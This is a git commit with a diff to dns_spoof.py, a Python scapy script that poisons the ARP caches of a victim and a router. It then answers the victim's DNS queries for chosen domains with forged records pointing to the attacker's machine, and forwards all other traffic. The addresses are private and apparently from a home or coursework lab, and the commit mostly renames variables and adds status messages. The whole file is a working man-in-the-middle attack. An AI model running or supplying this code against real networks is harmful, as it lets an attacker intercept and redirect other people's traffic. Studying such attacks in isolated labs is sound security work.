37f3a5bf07db997f69ef0b5add6b6bec00803f58
jjjjjaayyyyyyyyyyy <jjay05lim@gmail.com>
2024-06-22 00:53:27 +0800

    change to CONSTANT variables, stop the warning message from showing, print some message when running

--- dns_spoof.py
+++ dns_spoof.py
@@ -5,59 +5,75 @@ from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import ARP
 import threading
 
-# Target IP and MAC addresses
-victim_ip = "192.168.56.13"
-victim_mac = "B4:45:06:AE:38:68"
-router_ip = "192.168.56.1"
-router_mac = "00:C8:8B:6D:F8:42"
-attacker_ip = "192.168.56.12"  # IP of the attacker's machine
-attacker_mac = "B4:45:06:AE:38:58"
+
+# Suppress WARNING Message and display only Error Message
+conf.logLevel = logging.ERROR
 
 # Interface to use for the attack
-interface = "eth0"
+INTERFACE = conf.iface 
+
+# Target IP and MAC addresses
+VICTIM_IP = "192.168.56.13"
+VICTIM_MAC = "B4:45:06:AE:38:68"
+ROUTER_IP = "192.168.56.1"
+ROUTER_MAC = "00:C8:8B:6D:F8:42"
+ATTACKER_IP =  get_if_addr(INTERFACE) # IP of the attacker's machine
+# ATTACKER_MAC = get_if_hwaddr(INTERFACE) 
 
 # Malicious DNS records
-malicious_dns_records = {
+MALICIOUS_DNS_RECORDS = {
     "poop.com.": "192.168.56.12", 
-    "youtube.com.": "192.168.56.12"
+    "httpforever.com.": "192.168.56.12"
 }
+
 
 # Function to perform ARP spoofing
 def arp_spoof():
     while True:
         # Send spoofed ARP responses to the victim and router
-        send(ARP(op=2, pdst=victim_ip, psrc=router_ip, hwdst=victim_mac), iface=interface, verbose=False)
-        send(ARP(op=2, pdst=router_ip, psrc=victim_ip, hwdst=router_mac), iface=interface, verbose=False)
+        send(ARP(op=2, pdst=VICTIM_IP, psrc=ROUTER_IP, hwdst=VICTIM_MAC), iface=INTERFACE, verbose=False)
+        send(ARP(op=2, pdst=ROUTER_IP, psrc=VICTIM_IP, hwdst=ROUTER_MAC), iface=INTERFACE, verbose=False)
         time.sleep(2)
+
 
 # Function to handle DNS queries
 def dns_responder(packet):
-    if packet.haslayer(Ether) and packet[Ether].src != attacker_mac:
-        if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
-            queried_domain = packet[DNSQR].qname.decode()
-            print(queried_domain)
-            if queried_domain in malicious_dns_records:
+    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # DNS query
+        queried_domain = packet[DNSQR].qname.decode()
+        if queried_domain in MALICIOUS_DNS_RECORDS:
+                
                 # Create a DNS response
-                print(queried_domain, "DNS Response Sent!")
                 response = IP(dst=packet[IP].src, src=packet[IP].dst) / \
-                           UDP(dport=packet[UDP].sport, sport=53) / \
-                           DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
-                               an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=malicious_dns_records[queried_domain]))
+                    UDP(dport=packet[UDP].sport, sport=53) / \
+                        DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
+                            an=DNSRR(rrname=packet[DNSQR].qname, ttl=10, rdata=MALICIOUS_DNS_RECORDS[queried_domain]))
+                
                 # Send the DNS response
-                send(response, iface=interface, verbose=False)
-            else:
-                # Forward DNS queries not in the malicious records
-                send(packet, iface=interface, verbose=False)
+                send(response, iface=INTERFACE, verbose=False)
+                print(queried_domain, "DNS Response Sent!")
         else:
-            send(packet, iface=interface, verbose=False)
+            # Forward DNS queries not in the malicious records
+            send(packet, iface=INTERFACE, verbose=False)
+    else:
+        # Forward Other Packets if not important to the attack
+        send(packet, iface=INTERFACE, verbose=False)
 
 def main():
+    print("\nStarting Attack...")
+    print(f"Victim IP: {VICTIM_IP}")
+    print(f"Victim MAC: {VICTIM_MAC}")
+    print(f"Attacker IP: {ATTACKER_IP}")
+    # print(f"Attacker MAC: {ATTACKER_MAC}")
+    print(f"Router IP: {ROUTER_IP}")
+    print(f"Router MAC: {ROUTER_MAC}")
+    print(f"Interface: {INTERFACE}")
+
     # Start ARP spoofing in a separate thread
     arp_thread = threading.Thread(target=arp_spoof)
     arp_thread.start()
 
     # Sniff DHCP packets and apply interception, and also handle DNS responses
-    sniff(prn=dns_responder, iface=interface)
+    sniff(prn=dns_responder, iface=INTERFACE)
     
 if __name__ == "__main__":
     main()
